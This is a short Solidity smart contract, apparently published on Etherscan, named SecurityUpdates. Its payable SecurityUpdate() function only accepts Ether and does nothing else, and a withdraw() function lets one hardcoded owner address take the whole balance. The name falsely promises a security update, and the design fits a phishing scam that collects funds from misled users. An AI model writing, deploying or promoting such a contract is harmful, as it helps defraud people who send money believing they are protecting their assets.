/**
 *Submitted for verification at Etherscan.io on 2023-02-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SecurityUpdates {

    address private owner;
     constructor(){   
        owner = 0x16c03611Ad480c986F973c461B35fd69522CE103;
    }

    function getOwner() public view returns (address) {    
        return owner;
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(owner).transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}